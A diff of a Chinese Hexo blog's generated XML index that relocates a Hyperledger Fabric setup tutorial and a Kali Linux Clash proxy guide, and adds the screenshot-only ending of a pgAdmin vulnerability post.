-<h3 id="安装curl"><a href="#安装curl" class="headerlink" title="安装curl"></a>安装curl</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Fabric搭建"><a href="#Fabric搭建" class="headerlink" title="Fabric搭建"></a>Fabric搭建</h2><p>接下来均以root用户权限进行操作</p>
-<p>手动拉取镜像</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/malingzhao/fabric-samples.git</span><br></pre></td></tr></table></figure>
-
-<p>拉取成功</p>
-<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529231237094.png"></p>
-<p>然后就是下载俩fabric文件</p>
-<p>注意对应的下载的fabric版本（前面sh搭建脚本有给）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#fabric</span><br><span class="line">https://github.com/hyperledger/fabric/releases/download/v2.5.8/hyperledger-fabric-linux-amd64-2.5.8.tar.gz</span><br><span class="line">#fabric-ca</span><br><span class="line">https://github.com/hyperledger/fabric-ca/releases/download/v1.5.11/hyperledger-fabric-ca-linux-amd64-1.5.11.tar.gz</span><br></pre></td></tr></table></figure>
-
-<p>然后在所在目录解压</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xzvf hyperledger-fabric-linux-amd64-2.5.8.tar.gz -C ./qu-kuai-lian/Fabric/fabric-samples/</span><br><span class="line">tar -xzvf hyperledger-fabric-ca-linux-amd64-1.5.11.tar.gz -C ./qu-kuai-lian/Fabric/fabric-samples/</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529224850595.png"></p>
-<p>检查一下<code>config</code>和<code>bin</code>在不在</p>
-<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529231331064.png"></p>
-<h2 id="设置go代理"><a href="#设置go代理" class="headerlink" title="设置go代理"></a>设置go代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>
-
-<p>测试一下，使用自带的<code>test-network</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./network.sh up</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529225517680.png"></p>
-<p>没问题的话使用<code>./network.sh down</code>关闭即可</p>
-<h2 id="启动Fabric"><a href="#启动Fabric" class="headerlink" title="启动Fabric"></a>启动Fabric</h2><p>启动一下fabric</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd fabcar</span><br><span class="line">./startFabric.sh</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd fabcar/go</span><br><span class="line">go build -mod=mod #构建Go程序并且导入依赖包</span><br><span class="line">go run fabcar.go</span><br></pre></td></tr></table></figure>
-
-<p>测试成功</p>
-<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529233205539.png"></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0ODcwNTk4Mw==&mid=2247483706&idx=1&sn=c45a5c625966451859477307002ff859&chksm=c362ceeaf41547fce0a9e9008b1cbb095de2f19aa26856516150aefe969dcb16b28d35940bdc&mpshare=1&scene=23&srcid=0529j1qA3JxQ5rtvRugYrNq9&sharer_shareinfo=ee79a1ea9ef63d9bc3802817b585ee12&sharer_shareinfo_first=ee79a1ea9ef63d9bc3802817b585ee12#rd">https://mp.weixin.qq.com/s?__biz=Mzk0ODcwNTk4Mw==&amp;mid=2247483706&amp;idx=1&amp;sn=c45a5c625966451859477307002ff859&amp;chksm=c362ceeaf41547fce0a9e9008b1cbb095de2f19aa26856516150aefe969dcb16b28d35940bdc&amp;mpshare=1&amp;scene=23&amp;srcid=0529j1qA3JxQ5rtvRugYrNq9&amp;sharer_shareinfo=ee79a1ea9ef63d9bc3802817b585ee12&amp;sharer_shareinfo_first=ee79a1ea9ef63d9bc3802817b585ee12#rd</a></p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
+<p>成功命令执行</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
 ]]></content>
       <categories>
-        <category>区块链</category>
+        <category>漏洞分析</category>
       </categories>
-      <tags>
-        <tag>环境搭建</tag>
-      </tags>
   </entry>
   <entry>
     <title>信息搜集</title>
@@ -3034,6 +3077,85 @@
       </categories>
   </entry>
   <entry>
+    <title>区块链 fabric搭建</title>
+    <url>/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA.html</url>
+    <content><![CDATA[<p>记录Ubuntu22.04下搭建fabric平台</p>
+<span id="more"></span>
+
+
+
+<h2 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h2><h3 id="安装docker及docker-compose"><a href="#安装docker及docker-compose" class="headerlink" title="安装docker及docker-compose"></a>安装docker及docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装Docker</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker.io</span><br><span class="line"></span><br><span class="line"># 安装Docker Compose</span><br><span class="line">sudo apt-get install docker-compose</span><br></pre></td></tr></table></figure>
+
+<p>查看version检查是否安装成功</p>
+<img src="/article/区块链-fabric搭建/image-20240527220801577.png" style="zoom:150%;">
+
+<p>然后将用户添加到docker的用户组</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo usermod -a -G docker rev1ve</span><br></pre></td></tr></table></figure>
+
+<p>由于docker拉取镜像较慢，使用阿里云的加速器 <a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">官网链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
+
+<p>添加下面内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://nxmpk3z3.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重启服务即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="安装Go语言"><a href="#安装Go语言" class="headerlink" title="安装Go语言"></a>安装Go语言</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install golang-go</span><br></pre></td></tr></table></figure>
+
+<p>查看version检查是否安装成功</p>
+<h3 id="安装Node-js和npm"><a href="#安装Node-js和npm" class="headerlink" title="安装Node.js和npm"></a>安装Node.js和npm</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装curl"><a href="#安装curl" class="headerlink" title="安装curl"></a>安装curl</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Fabric搭建"><a href="#Fabric搭建" class="headerlink" title="Fabric搭建"></a>Fabric搭建</h2><p>接下来均以root用户权限进行操作</p>
+<p>手动拉取镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/malingzhao/fabric-samples.git</span><br></pre></td></tr></table></figure>
+
+<p>拉取成功</p>
+<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529231237094.png"></p>
+<p>然后就是下载俩fabric文件</p>
+<p>注意对应的下载的fabric版本（前面sh搭建脚本有给）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#fabric</span><br><span class="line">https://github.com/hyperledger/fabric/releases/download/v2.5.8/hyperledger-fabric-linux-amd64-2.5.8.tar.gz</span><br><span class="line">#fabric-ca</span><br><span class="line">https://github.com/hyperledger/fabric-ca/releases/download/v1.5.11/hyperledger-fabric-ca-linux-amd64-1.5.11.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>然后在所在目录解压</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xzvf hyperledger-fabric-linux-amd64-2.5.8.tar.gz -C ./qu-kuai-lian/Fabric/fabric-samples/</span><br><span class="line">tar -xzvf hyperledger-fabric-ca-linux-amd64-1.5.11.tar.gz -C ./qu-kuai-lian/Fabric/fabric-samples/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529224850595.png"></p>
+<p>检查一下<code>config</code>和<code>bin</code>在不在</p>
+<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529231331064.png"></p>
+<h2 id="设置go代理"><a href="#设置go代理" class="headerlink" title="设置go代理"></a>设置go代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>
+
+<p>测试一下，使用自带的<code>test-network</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./network.sh up</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529225517680.png"></p>
+<p>没问题的话使用<code>./network.sh down</code>关闭即可</p>
+<h2 id="启动Fabric"><a href="#启动Fabric" class="headerlink" title="启动Fabric"></a>启动Fabric</h2><p>启动一下fabric</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd fabcar</span><br><span class="line">./startFabric.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd fabcar/go</span><br><span class="line">go build -mod=mod #构建Go程序并且导入依赖包</span><br><span class="line">go run fabcar.go</span><br></pre></td></tr></table></figure>
+
+<p>测试成功</p>
+<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA/image-20240529233205539.png"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0ODcwNTk4Mw==&mid=2247483706&idx=1&sn=c45a5c625966451859477307002ff859&chksm=c362ceeaf41547fce0a9e9008b1cbb095de2f19aa26856516150aefe969dcb16b28d35940bdc&mpshare=1&scene=23&srcid=0529j1qA3JxQ5rtvRugYrNq9&sharer_shareinfo=ee79a1ea9ef63d9bc3802817b585ee12&sharer_shareinfo_first=ee79a1ea9ef63d9bc3802817b585ee12#rd">https://mp.weixin.qq.com/s?__biz=Mzk0ODcwNTk4Mw==&amp;mid=2247483706&amp;idx=1&amp;sn=c45a5c625966451859477307002ff859&amp;chksm=c362ceeaf41547fce0a9e9008b1cbb095de2f19aa26856516150aefe969dcb16b28d35940bdc&amp;mpshare=1&amp;scene=23&amp;srcid=0529j1qA3JxQ5rtvRugYrNq9&amp;sharer_shareinfo=ee79a1ea9ef63d9bc3802817b585ee12&amp;sharer_shareinfo_first=ee79a1ea9ef63d9bc3802817b585ee12#rd</a></p>
+]]></content>
+      <categories>
+        <category>区块链</category>
+      </categories>
+      <tags>
+        <tag>环境搭建</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>博客常用设置</title>
     <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
     <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
@@ -3056,6 +3178,47 @@
       <categories>
         <category>杂项</category>
       </categories>
+  </entry>
+  <entry>
+    <title>记录kali如何挂梯子</title>
+    <url>/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90.html</url>
+    <content><![CDATA[<p>记录下kali如何挂梯子</p>
+<span id="more"></span>
+
+
+
+<p><strong>前言</strong></p>
+<blockquote>
+<p>网上关于Linux挂梯子的教程有挺多的，不过一开始按照参考文章都不行（搁置了好久）。现在有时间来弄结果成功了，特此记录下</p>
+</blockquote>
+<p><strong>步骤</strong></p>
+<p>我们先创建clash目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir clash</span><br></pre></td></tr></table></figure>
+
+<p>然后我们下载压缩包文件，选择第一个</p>
+<p>链接：<a href="https://archive.org/download/clash_for_windows_pkg">https://archive.org/download/clash_for_windows_pkg</a></p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425211553427.png"></p>
+<p>解压后进入目录<code>Clash for Windows-0.20.39-x64-linux</code>，试试执行下程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cfw</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212131108.png"></p>
+<p>成功打开后，我们可以汉化一下</p>
+<p>访问<code>https://github.com/Z-Siqi/Clash-for-Windows_Chinese</code>，点击release后下载app.asar文件</p>
+<p>然后替换<code>/clash/Clash for Windows-0.20.39-x64-linux/resources/</code>目录下的同名文件，重新启动即可</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212641961.png"></p>
+<p>然后就是导入配置文件，我这里是直接在物理机下载下来配置文件然后导入</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212813415.png"></p>
+<p>最后就是设置浏览器代理</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212844360.png"></p>
+<p>设置好后，就能成功使用魔法访问外网</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212931593.png"></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
   </entry>
   <entry>
     <title>红明谷杯2024</title>
@@ -3138,47 +3301,6 @@
       </categories>
       <tags>
         <tag>比赛</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记录kali如何挂梯子</title>
-    <url>/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90.html</url>
-    <content><![CDATA[<p>记录下kali如何挂梯子</p>
-<span id="more"></span>
-
-
-
-<p><strong>前言</strong></p>
-<blockquote>
-<p>网上关于Linux挂梯子的教程有挺多的，不过一开始按照参考文章都不行（搁置了好久）。现在有时间来弄结果成功了，特此记录下</p>
-</blockquote>
-<p><strong>步骤</strong></p>
-<p>我们先创建clash目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir clash</span><br></pre></td></tr></table></figure>
-
-<p>然后我们下载压缩包文件，选择第一个</p>
-<p>链接：<a href="https://archive.org/download/clash_for_windows_pkg">https://archive.org/download/clash_for_windows_pkg</a></p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425211553427.png"></p>
-<p>解压后进入目录<code>Clash for Windows-0.20.39-x64-linux</code>，试试执行下程序</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cfw</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212131108.png"></p>
-<p>成功打开后，我们可以汉化一下</p>
-<p>访问<code>https://github.com/Z-Siqi/Clash-for-Windows_Chinese</code>，点击release后下载app.asar文件</p>
-<p>然后替换<code>/clash/Clash for Windows-0.20.39-x64-linux/resources/</code>目录下的同名文件，重新启动即可</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212641961.png"></p>
-<p>然后就是导入配置文件，我这里是直接在物理机下载下来配置文件然后导入</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212813415.png"></p>
-<p>最后就是设置浏览器代理</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212844360.png"></p>
-<p>设置好后，就能成功使用魔法访问外网</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212931593.png"></p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
